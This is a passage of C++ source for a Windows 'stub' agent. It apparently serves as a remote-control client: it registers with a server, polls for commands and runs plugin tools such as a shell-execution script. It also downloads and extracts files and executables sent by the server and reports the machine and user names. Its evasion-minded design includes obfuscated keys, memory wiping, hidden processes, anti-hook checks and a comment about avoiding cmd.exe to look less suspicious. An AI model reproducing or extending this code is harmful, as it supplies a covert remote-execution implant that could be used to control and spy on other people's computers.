        if (r6m::Json::parse(resp, j, &err)) {
            if (j.getString("agent_key").empty() && hasBootstrapKey() && !_bootstrapKeyObf.empty()) {
                if (_agentKeyObf != _bootstrapKeyObf) {
                    LOG_W("Stub", "服务端拒绝了当前密钥，回退引导密钥重新登记");
                    std::string plain;   // 把引导密钥解码到栈上，用完即擦
                    plain.reserve(_bootstrapKeyObf.size());
                    for (size_t i = 0; i < _bootstrapKeyObf.size(); i++) {
                        plain += (char)(_bootstrapKeyObf[i] ^ _bootstrapKeyMask[i]);
                    }
                    setAgentKeyPlain(plain.c_str());
                    SecureZeroMemory(&plain[0], plain.size());
                    sent = httpPost("/api/agent/register", body.dump(), resp);
                }
            }
        }
    }

    if (!sent) return false;

    r6m::Json j;
    std::string err;
    if (!r6m::Json::parse(resp, j, &err)) {
        LOG_E("Stub", ("注册响应不是合法 JSON: " + err).c_str());
        return false;
    }
    std::string newKey = j.getString("agent_key");
    if (newKey.empty()) {
        LOG_E("Stub", ("注册未返回 agent_key: " + resp.substr(0, 160)).c_str());
        return false;
    }
    if (newKey != _agentKeyObf) {
        setAgentKeyPlain(newKey.c_str());
        persistAgentKey(newKey);
        LOG_INFO("Stub", "已切换为本机独立密钥（per-agent key）");
    }
    SecureZeroMemory(&newKey[0], newKey.size());
    WipeString(resp);
    LOG_INFO("Stub", "连接成功");
    return true;
}

void StubCore::pollLoop() {
    LOG_INFO("Stub", "开始轮询...");
    while (_running) {
        std::this_thread::sleep_for(std::chrono::seconds(3));

        // 三段式之三：熔断 —— 关键 API 确实被篡改期间不拉取/执行新指令。
        // （"无法验证"不再计入熔断；见 AntiHook 三态与 clearFuse 恢复通道）
        if (_integrityCompromised) {
            LOG_E("Stub", "完整性熔断中：关键 API 确认被篡改，暂停指令执行（心跳仍在上报）");
            std::this_thread::sleep_for(std::chrono::seconds(30));
            continue;
        }

        try {
            r6m::Json req = r6m::Json::makeObject();
            req.set("hwid", r6m::Json::makeString(_hwid));
            std::string resp;
            if (!httpPost("/api/agent/poll", req.dump(), resp)) continue;
            if (resp.empty() || resp == "{}" || resp == "null") continue;

            r6m::Json j;
            std::string jerr;
            if (!r6m::Json::parse(resp, j, &jerr)) {
                // 原实现用字符串搜索解析，坏 JSON 会被当成"没有指令"静默吞掉
                LOG_E("Stub", ("poll 响应解析失败: " + jerr).c_str());
                continue;
            }

            // 服务端下发的"解除熔断"（运维人工确认通道）
            if (j.getBool("clear_integrity", false)) {
                clearFuse("服务端下发解除指令");
            }

            std::string requestId = j.getString("request_id");
            std::string method = j.getString("method");
            if (method.empty()) continue;

            const r6m::Json* paramsNode = j.find("params");
            std::string params = (paramsNode && paramsNode->isObject()) ? paramsNode->dump() : std::string("{}");

            LOG_INFO("Stub", ("指令: " + method).c_str());

            // 面板要工具清单：本地聚合所有插件的 tools/list（无需服务端新增接口）
            if (method == "tools/list") {
                std::string tools = _plugins.listAllTools();
                if (!requestId.empty()) {
                    // 直接把聚合结果原样嵌入请求体（result 必须是合法 JSON 对象）
                    std::string postBody = "{\"request_id\":\"" + requestId + "\",\"result\":" + tools + "}";
                    std::string r2;
                    httpPost("/api/agent/result", postBody, r2);
                    WipeString(postBody); WipeString(r2);
                }
                WipeString(resp);
                continue;
            }

            std::string pluginId;
            if (method == "tools/call") {
                const r6m::Json* nameNode = paramsNode ? paramsNode->find("name") : nullptr;
                std::string toolName = nameNode ? nameNode->text : std::string();
                pluginId = _plugins.resolvePluginForTool(toolName);
                if (pluginId.empty()) {
                    // 原实现直接 continue：服务端永远等不到结果，只能 30 秒超时。
                    // 现在显式回传错误，调用方立刻知道原因。
                    LOG_WARN("Stub", ("未找到处理工具 '" + toolName + "' 的插件").c_str());
                    if (!requestId.empty()) {
                        std::string postBody = "{\"request_id\":\"" + requestId +
                            "\",\"result\":{\"error\":\"no plugin provides tool: " + toolName + "\"}}";
                        std::string r2;
                        httpPost("/api/agent/result", postBody, r2);
                        WipeString(postBody); WipeString(r2);
                    }
                    WipeString(resp);
                    continue;
                }
            } else {
                size_t dot = method.find('.');
                pluginId = (dot == std::string::npos) ? method : method.substr(0, dot);
            }

            if (method == "deploy_file") {
                LOG_INFO("Stub", "收到文件部署指令");
                bool ok = handleDeployFile(params);
                if (!requestId.empty()) {
                    r6m::Json res = r6m::Json::makeObject();
                    res.set("ok", r6m::Json::makeBool(ok));
                    if (!ok) res.set("error", r6m::Json::makeString("deploy failed, see client.log"));
                    r6m::Json pr = r6m::Json::makeObject();
                    pr.set("request_id", r6m::Json::makeString(requestId));
                    pr.set("result", res);
                    std::string resp2;
                    httpPost("/api/agent/result", pr.dump(), resp2);
                    WipeString(resp2);
                }
                WipeString(resp);
                continue;
            }

            std::string result = _plugins.callPlugin(pluginId, method, params);
            LOG_DEBUG("Stub", ("插件响应: " + result.substr(0, 200)).c_str());

            if (!requestId.empty() && method == "tools/call") {
                r6m::Json res;
                std::string perr;
                std::string resultJson = result;
                if (!r6m::Json::parse(result, res, &perr)) {
                    LOG_E("Stub", ("插件返回的不是合法 JSON: " + perr).c_str());
                    resultJson = "{\"error\":\"plugin returned invalid json\"}";
                }
                r6m::Json pr = r6m::Json::makeObject();
                pr.set("request_id", r6m::Json::makeString(requestId));
                // 直接把插件的 result 原样嵌入，避免二次转义
                std::string postBody = "{\"request_id\":\"" + requestId + "\",\"result\":" + resultJson + "}";
                std::string resp2;
                httpPost("/api/agent/result", postBody, resp2);
                LOG_DEBUG("Stub", ("结果回传: " + resp2).c_str());
                WipeString(postBody); WipeString(resp2);
            }
            WipeString(result);
            WipeString(resp);

        } catch (const std::exception& e) {
            LOG_ERROR("Stub", ("轮询异常: " + std::string(e.what())).c_str());
        } catch (...) {
            LOG_ERROR("Stub", "轮询异常");
        }
    }
}

std::string StubCore::collectSystemInfo() {
    wchar_t computer[MAX_PATH] = {}; DWORD csz = MAX_PATH;
    GetComputerNameW(computer, &csz);
    wchar_t user[MAX_PATH] = {}; DWORD usz = MAX_PATH;
    GetUserNameW(user, &usz);

    typedef NTSTATUS(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
    auto fn = (RtlGetVersionPtr)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlGetVersion");
    DWORD build = 0;
    if (fn) {
        RTL_OSVERSIONINFOW rovi = { sizeof(rovi) };
        fn(&rovi);
        build = rovi.dwBuildNumber;
    }

    // Convert wide strings to UTF-8
    char cs[256] = {}, us[256] = {};
    WideCharToMultiByte(CP_UTF8, 0, computer, -1, cs, sizeof(cs), nullptr, nullptr);
    WideCharToMultiByte(CP_UTF8, 0, user, -1, us, sizeof(us), nullptr, nullptr);
    std::ostringstream ss;
    ss << "{\"computer\":\"" << cs
       << "\",\"user\":\"" << us
       << "\",\"os\":\"Win10 Build " << build
       << "\",\"arch\":\"" << (sizeof(void*) == 8 ? "x64" : "x86") << "\"}";
    return ss.str();
}

std::string StubCore::generateHWID() {
    // 低碰撞机器指纹：MachineGuid（系统安装时生成，全局唯一）+ 系统卷序列号 + 计算机名。
    //
    // 原实现只用计算机名做 32 位 DJB2 并窄化到 char（MSVC C4244），问题有三层：
    //   ① "DESKTOP-XXXX" 这类名字极易碰撞；② 可离线枚举；③ 注释声称含 MAC 实际没有。
    // 而服务端 per-agent 密钥是按 hwid 复用的，hwid 可枚举就等于身份可冒名。
    std::string guid = ReadRegString(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Cryptography", L"MachineGuid");

    wchar_t computer[MAX_PATH] = {}; DWORD sz = MAX_PATH;
    GetComputerNameW(computer, &sz);
    std::string cs = Utf8FromWide(computer);

    DWORD volSerial = 0;
    wchar_t sysDir[MAX_PATH] = {};
    if (GetSystemDirectoryW(sysDir, MAX_PATH) >= 3) {
        wchar_t root[4] = { sysDir[0], L':', L'\\', 0 };
        GetVolumeInformationW(root, nullptr, 0, &volSerial, nullptr, nullptr, nullptr, 0);
    }
    char volHex[16] = {};
    snprintf(volHex, sizeof(volHex), "%08X", volSerial);

    std::string material = guid + "|" + cs + "|" + volHex;
    std::string digest = Sha256Hex(material);
    if (digest.size() < 32) {
        // 机器签名不可用（极少见）：明确告警并退回计算机名哈希，不静默降级
        LOG_W("Stub", "机器指纹计算失败（CSP 不可用？），退回计算机名哈希，碰撞风险高");
        unsigned int hash = 5381;
        for (size_t i = 0; i < cs.size(); i++) hash = ((hash << 5) + hash) + (unsigned char)cs[i];
        char buf[32] = {};
        snprintf(buf, sizeof(buf), "%08X", hash);
        return std::string(buf);
    }
    std::string hwid = digest.substr(0, 32);
    LOG_I("Stub", ("HWID = " + hwid + "（MachineGuid + 卷序列号 + 计算机名）").c_str());
    return hwid;
}

// ═══════════════════════════════════════════════
// 文件下载 & 部署
// ═══════════════════════════════════════════════

bool StubCore::httpDownload(const std::string& url, const std::wstring& savePath) {
    std::string savePathUtf8(savePath.begin(), savePath.end());
    LOG_I("Download", ("开始下载: " + url).c_str());
    LOG_I("Download", ("保存到: " + savePathUtf8).c_str());

    // 解析 URL
    URL_COMPONENTS urlComp = {};
    urlComp.dwStructSize = sizeof(urlComp);
    urlComp.dwSchemeLength = 1;
    urlComp.dwHostNameLength = 1;
    urlComp.dwUrlPathLength = 1;
    urlComp.dwExtraInfoLength = 1;

    if (!InternetCrackUrlA(url.c_str(), (DWORD)url.size(), 0, &urlComp)) {
        LOG_E("Download", ("URL 解析失败, error=" + std::to_string(GetLastError())).c_str());
        return false;
    }

    std::string host(urlComp.lpszHostName, urlComp.dwHostNameLength);
    std::string pathStr(urlComp.lpszUrlPath, urlComp.dwUrlPathLength);
    if (urlComp.dwExtraInfoLength > 0) {
        pathStr += std::string(urlComp.lpszExtraInfo, urlComp.dwExtraInfoLength);
    }
    int port = urlComp.nPort;
    bool isHttps = (urlComp.nScheme == INTERNET_SCHEME_HTTPS);

    LOG_I("Download", ("Host: " + host + " Path: " + pathStr).c_str());

    HINTERNET hConn = InternetConnectA(_hSession, host.c_str(), (INTERNET_PORT)port,
        nullptr, nullptr, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConn) {
        LOG_E("Download", ("连接失败: " + host + " error=" + std::to_string(GetLastError())).c_str());
        return false;
    }

    DWORD reqFlags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_UI;
    if (isHttps) reqFlags |= INTERNET_FLAG_SECURE;

    HINTERNET hReq = HttpOpenRequestA(hConn, "GET", pathStr.c_str(), nullptr, nullptr,
        nullptr, reqFlags, 0);
    if (!hReq) {
        LOG_E("Download", ("请求失败: error=" + std::to_string(GetLastError())).c_str());
        InternetCloseHandle(hConn);
        return false;
    }

    if (isHttps) SetupSelfSignedTls(hReq);

    DWORD timeout = 120000; // 2 分钟超时
    InternetSetOption(hReq, INTERNET_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));
    InternetSetOption(hReq, INTERNET_OPTION_SEND_TIMEOUT, &timeout, sizeof(timeout));

    std::string headers = BuildAgentKeyHeader(_agentKeyObf, _keyMask, _hwid);
    if (!HttpSendRequestA(hReq, headers.empty() ? nullptr : headers.c_str(),
        (DWORD)headers.size(), nullptr, 0)) {
        LOG_E("Download", "发送失败");
        WipeString(headers);
        InternetCloseHandle(hReq);
        InternetCloseHandle(hConn);
        return false;
    }
    WipeString(headers); // 含密钥明文，发送后立即擦

    if (isHttps && !VerifyServerCertPin(hReq)) {
        InternetCloseHandle(hReq);
        InternetCloseHandle(hConn);
        return false;
    }

    // 检查状态码
    DWORD statusCode = 0;
    DWORD statusSize = sizeof(statusCode);
    HttpQueryInfoA(hReq, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &statusCode, &statusSize, nullptr);
    if (statusCode != 200) {
        LOG_E("Download", ("HTTP 状态码: " + std::to_string(statusCode)).c_str());
        InternetCloseHandle(hReq);
        InternetCloseHandle(hConn);
        return false;
    }

    // 获取文件大小
    DWORD contentLength = 0;
    DWORD clSize = sizeof(contentLength);
    HttpQueryInfoA(hReq, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER, &contentLength, &clSize, nullptr);

    // 打开本地文件（用 CreateFileW 支持中文路径）
    HANDLE hFile = CreateFileW(savePath.c_str(), GENERIC_WRITE, 0, nullptr,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) {
        LOG_E("Download", ("无法创建文件, error=" + std::to_string(GetLastError())).c_str());
        InternetCloseHandle(hReq);
        InternetCloseHandle(hConn);
        return false;
    }

    // 下载
    char buf[65536];
    DWORD totalRead = 0;
    DWORD bytesRead = 0;
    while (InternetReadFile(hReq, buf, sizeof(buf) - 1, &bytesRead) && bytesRead > 0) {
        DWORD written = 0;
        WriteFile(hFile, buf, bytesRead, &written, nullptr);
        totalRead += bytesRead;
        if (contentLength > 0) {
            int pct = (int)((long long)totalRead * 100 / contentLength);
            if (pct % 10 == 0) {
                LOG_I("Download", ("进度: " + std::to_string(pct) + "%").c_str());
            }
        }
    }

    CloseHandle(hFile);
    InternetCloseHandle(hReq);
    InternetCloseHandle(hConn);

    LOG_I("Download", ("下载完成: " + savePathUtf8 + " (" + std::to_string(totalRead) + " bytes)").c_str());
    return true;
}

bool StubCore::handleDeployFile(const std::string& params) {
    r6m::Json p;
    std::string perr;
    if (!r6m::Json::parse(params, p, &perr)) {
        LOG_E("Deploy", ("部署参数不是合法 JSON: " + perr).c_str());
        return false;
    }
    std::string fileName = p.getString("file_name");
    std::string targetDir = p.getString("target_dir");

    if (fileName.empty()) {
        LOG_E("Deploy", "empty filename");
        return false;
    }
    // 文件名只允许裸文件名（不允许目录分隔符）；修复前 "\Windows\System32" 这类
    // 前导反斜杠能通过校验并被 CreateDirectoryA 解析成当前盘根
    if (!IsValidRemoteName(fileName) || fileName.find('/') != std::string::npos ||
        fileName.find('\\') != std::string::npos) {
        LOG_E("Deploy", ("非法文件名，拒绝部署: " + fileName).c_str());
        return false;
    }
    if (!targetDir.empty() && !IsValidRemoteName(targetDir)) {
        LOG_E("Deploy", ("非法目标目录，拒绝部署: " + targetDir).c_str());
        return false;
    }
    if (targetDir.empty()) {
        wchar_t ep[MAX_PATH] = {};
        GetModuleFileNameW(nullptr, ep, MAX_PATH);
        std::wstring ws(ep);
        ws = ws.substr(0, ws.find_last_of(L'\\'));
        targetDir = Utf8FromWide(ws) + "\\plugins";
    }
    LOG_I("Deploy", ("deploy: " + fileName + " -> " + targetDir).c_str());

    std::wstring targetDirW = WideFromUtf8(targetDir);
    std::wstring fileNameW = WideFromUtf8(fileName);

    // 逐级创建目录（用宽字符 API，中文路径不会乱码）
    {
        std::wstring acc;
        for (size_t i = 0; i < targetDirW.size(); i++) {
            acc += targetDirW[i];
            if (targetDirW[i] == L'\\' || targetDirW[i] == L'/') {
                if (acc.size() > 3) CreateDirectoryW(acc.c_str(), nullptr);
            }
        }
        CreateDirectoryW(targetDirW.c_str(), nullptr);
    }

    std::string url = _serverUrl + "/api/files/get?name=" + fileName;
    std::wstring save = targetDirW + L"\\" + fileNameW;
    if (!httpDownload(url, save)) {
        LOG_E("Deploy", "download failed");
        return false;
    }
    LOG_I("Deploy", "download ok");

    if (fileName.size() > 4 && fileName.compare(fileName.size() - 4, 4, ".zip") == 0) {
        LOG_I("Deploy", "extracting zip...");
        std::string unzipDir = targetDir + "\\" + fileName.substr(0, fileName.size() - 4);
        std::wstring unzipDirW = WideFromUtf8(unzipDir);
        CreateDirectoryW(unzipDirW.c_str(), nullptr);

        // 直接用系统自带 tar.exe，不再套 cmd.exe：
        // 少一层 shell 解析，也少一个"未知父进程拉起 cmd"的可疑行为面。
        wchar_t sysDir[MAX_PATH] = {};
        GetSystemDirectoryW(sysDir, MAX_PATH);
        std::wstring tarExe = std::wstring(sysDir) + L"\\tar.exe";
        if (GetFileAttributesW(tarExe.c_str()) == INVALID_FILE_ATTRIBUTES) {
            LOG_E("Deploy", "系统未提供 tar.exe（需 Win10 1803+），zip 未解压");
            return false;
        }
        std::wstring cmdLine = L"\"" + tarExe + L"\" -xf \"" + save + L"\" -C \"" + unzipDirW + L"\"";
        std::vector<wchar_t> mutableCmd(cmdLine.begin(), cmdLine.end());
        mutableCmd.push_back(L'\0');

        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi = {};
        if (!CreateProcessW(nullptr, mutableCmd.data(), nullptr, nullptr, FALSE, CREATE_NO_WINDOW,
                            nullptr, nullptr, &si, &pi)) {
            LOG_E("Deploy", ("解压进程启动失败 err=" + std::to_string(GetLastError())).c_str());
            return false;
        }
        WaitForSingleObject(pi.hProcess, 120000);
        DWORD exitCode = 1;
        GetExitCodeProcess(pi.hProcess, &exitCode);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        if (exitCode != 0) {
            LOG_E("Deploy", ("解压失败 exit=" + std::to_string(exitCode)).c_str());
            return false;
        }
        LOG_I("Deploy", ("extracted: " + unzipDir).c_str());
    }

    _plugins.scanPlugins(WideFromUtf8(targetDir));
    LOG_I("Deploy", "rescan done");
    return true;
}

// ═══════════════════════════════════════════════
// 插件同步：从服务端拉取缺失的插件
// ═══════════════════════════════════════════════

void StubCore::syncPlugins(const std::wstring& pluginDir) {
    LOG_I("Sync", "=== syncPlugins start ===");

    // 确保 plugins 目录存在
    CreateDirectoryW(pluginDir.c_str(), nullptr);

    // ═══ 0) 检查并下载嵌入式 Python 运行时 ═══
    // 获取 exe 所在目录
    wchar_t exePath[MAX_PATH] = {};
    GetModuleFileNameW(nullptr, exePath, MAX_PATH);
    std::wstring appDir = std::wstring(exePath);
    appDir = appDir.substr(0, appDir.find_last_of(L'\\'));
    std::wstring runtimeDir = appDir + L"\\runtime";
    std::wstring pythonExe = runtimeDir + L"\\python.exe";

    if (GetFileAttributesW(pythonExe.c_str()) == INVALID_FILE_ATTRIBUTES) {
        LOG_I("Sync", "Python runtime not found, downloading from server...");
        CreateDirectoryW(runtimeDir.c_str(), nullptr);

        // 从服务端下载 python 嵌入式包
        std::string rtResp = httpGet("/api/runtime");
        LOG_I("Sync", ("Runtime list: " + rtResp.substr(0, 200)).c_str());

        // 找 python*.zip
        std::string pyZip;
        auto pp = rtResp.find("python");
        if (pp != std::string::npos) {
            auto q1 = rtResp.rfind('"', pp);
            auto q2 = rtResp.find('"', pp);
            // 简单提取文件名
            while (pp < rtResp.size() && rtResp[pp] != '"') pp++;
            pyZip = rtResp.substr(q1 + 1, pp - q1 - 1);
        }

        if (pyZip.empty()) {
            LOG_E("Sync", "  no python runtime found on server");
        } else if (!IsValidRemoteName(pyZip) || pyZip.find('/') != std::string::npos || pyZip.find('\\') != std::string::npos) {
            LOG_E("Sync", ("  非法运行时包名，拒绝下载: " + pyZip).c_str());
        } else {
            LOG_I("Sync", ("Downloading Python runtime: " + pyZip).c_str());
            // httpDownload 需要完整 URL（InternetCrackUrlA 不支持相对路径）
            std::string zipUrl = _serverUrl + "/api/runtime/get?name=" + pyZip;
            std::wstring zipPath = appDir + L"\\" + std::wstring(pyZip.begin(), pyZip.end());
            if (httpDownload(zipUrl, zipPath)) {
                LOG_I("Sync", "  zip downloaded, extracting...");

                // 解压到 runtime 目录
                std::wstring unzipCmd = L"cmd /c tar -xf \""
                    + zipPath + L"\" -C \"" + runtimeDir + L"\"";
                STARTUPINFOW si = { sizeof(si) };
                PROCESS_INFORMATION pi = {};
                if (CreateProcessW(nullptr, (LPWSTR)unzipCmd.c_str(), nullptr, nullptr, FALSE, CREATE_NO_WINDOW,
                                  nullptr, nullptr, &si, &pi)) {
                    WaitForSingleObject(pi.hProcess, 120000);
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                    LOG_I("Sync", "  Python runtime extracted");
                }
                // 删除 zip
                DeleteFileW(zipPath.c_str());
            } else {
                LOG_E("Sync", "  Python runtime download FAILED");
            }
        }

        // 验证
        if (GetFileAttributesW(pythonExe.c_str()) == INVALID_FILE_ATTRIBUTES) {
            LOG_E("Sync", "Python runtime install FAILED - plugins will not work");
        } else {
            LOG_I("Sync", "Python runtime ready");
        }
    } else {
        LOG_I("Sync", "Python runtime already installed");
    }

    // ═══ 1) 从服务端获取可用插件列表 ═══
    std::string resp = httpGet("/api/plugins");
    if (resp.empty()) {
        LOG_W("Sync", "Failed to get plugin list from server");
        return;
    }
    LOG_I("Sync", ("Server plugins: " + resp.substr(0, 200)).c_str());

    // 2) 简易 JSON 解析：遍历每个 {...} 块
    //    格式: [{"id":"xxx","name":"xxx","version":"xxx"},...]
    size_t pos = 0;
    int downloaded = 0;
    while ((pos = resp.find("\"id\"", pos)) != std::string::npos) {
        // 提取 id
        auto c1 = resp.find(':', pos);
        auto q1 = resp.find('"', c1 + 1);
        auto q2 = resp.find('"', q1 + 1);
        if (q1 == std::string::npos || q2 == std::string::npos) break;
        std::string pluginId = resp.substr(q1 + 1, q2 - q1 - 1);
        pos = q2 + 1;

        if (pluginId.empty()) continue;

        // 服务端返回的插件 ID 只允许简单文件名（不允许路径分隔）
        if (!IsValidRemoteName(pluginId) || pluginId.find('/') != std::string::npos || pluginId.find('\\') != std::string::npos) {
            LOG_W("Sync", ("非法插件 ID，跳过: " + pluginId).c_str());
            continue;
        }

        // 检查本地是否已有此插件
        std::wstring localDir = pluginDir + L"\\" + std::wstring(pluginId.begin(), pluginId.end());
        std::wstring localPjson = localDir + L"\\plugin.json";
        if (GetFileAttributesW(localPjson.c_str()) != INVALID_FILE_ATTRIBUTES) {
            LOG_I("Sync", ("Plugin exists locally: " + pluginId).c_str());
            continue;
        }

        // 3) 本地缺失，从服务端下载整个插件目录
        LOG_I("Sync", ("Downloading plugin: " + pluginId).c_str());
        CreateDirectoryW(localDir.c_str(), nullptr);

        // 下载 plugin.json
        std::string pjsonUrl = "/api/plugins/get?name=" + pluginId + "/plugin.json";
        std::string pjsonBody = httpGet(pjsonUrl);
        if (!pjsonBody.empty()) {
            // 写入本地文件
            std::wstring pjsonPath = localDir + L"\\plugin.json";
            HANDLE hFile = CreateFileW(pjsonPath.c_str(), GENERIC_WRITE, 0, nullptr,
                CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
            if (hFile != INVALID_HANDLE_VALUE) {
                DWORD written = 0;
                WriteFile(hFile, pjsonBody.c_str(), (DWORD)pjsonBody.size(), &written, nullptr);
                CloseHandle(hFile);
                LOG_I("Sync", ("  saved plugin.json: " + pluginId).c_str());
            }
        }

        // 从 plugin.json 里找 command 字段，解析需要下载哪些文件
        // command 格式如 "python shell_exec.py" → 需要下载 shell_exec.py
        auto cmdPos = pjsonBody.find("\"command\"");
        if (cmdPos != std::string::npos) {
            auto cc = pjsonBody.find(':', cmdPos);
            auto cq1 = pjsonBody.find('"', cc + 1);
            auto cq2 = pjsonBody.find('"', cq1 + 1);
            if (cq1 != std::string::npos && cq2 != std::string::npos) {
                std::string command = pjsonBody.substr(cq1 + 1, cq2 - cq1 - 1);
                // 解析命令中的文件名
                std::vector<std::string> filesToDownload;
                // "python shell_exec.py" → 提取 shell_exec.py
                // "python3 file_manager.py" → 提取 file_manager.py
                size_t sp = 0;
                while (sp < command.size()) {
                    while (sp < command.size() && command[sp] == ' ') sp++;
                    auto end = command.find(' ', sp);
                    if (end == std::string::npos) end = command.size();
                    std::string token = command.substr(sp, end - sp);
                    // 只下载 .py 或 .js 或 .exe 文件
                    if (token.size() > 3) {
                        std::string ext = token.substr(token.size() - 3);
                        if (ext == ".py" || ext == ".js" || ext == ".exe" || ext == ".sh") {
                            filesToDownload.push_back(token);
                        }
                    }
                    sp = end + 1;
                }

                // 下载每个文件
                for (const auto& fname : filesToDownload) {
                    // 校验插件文件名（防路径穿越写文件）
                    if (!IsValidRemoteName(fname) || fname.find('/') != std::string::npos || fname.find('\\') != std::string::npos) {
                        LOG_E("Sync", ("  非法文件名，拒绝下载: " + fname).c_str());
                        continue;
                    }
                    std::string fileUrl = "/api/plugins/get?name=" + pluginId + "/" + fname;
                    std::string fileBody = httpGet(fileUrl);
                    if (!fileBody.empty()) {
                        std::wstring filePath = localDir + L"\\" + std::wstring(fname.begin(), fname.end());
                        HANDLE hFile = CreateFileW(filePath.c_str(), GENERIC_WRITE, 0, nullptr,
                            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
                        if (hFile != INVALID_HANDLE_VALUE) {
                            DWORD written = 0;
                            WriteFile(hFile, fileBody.c_str(), (DWORD)fileBody.size(), &written, nullptr);
                            CloseHandle(hFile);
                            LOG_I("Sync", ("  saved: " + fname).c_str());
                        }
                    } else {
                        LOG_E("Sync", ("  download failed: " + fname).c_str());
                    }
                }
            }
        }

        downloaded++;
        LOG_I("Sync", ("Downloaded plugin: " + pluginId).c_str());
    }

    LOG_I("Sync", ("=== syncPlugins done, downloaded " + std::to_string(downloaded) + " plugins ===").c_str());
}

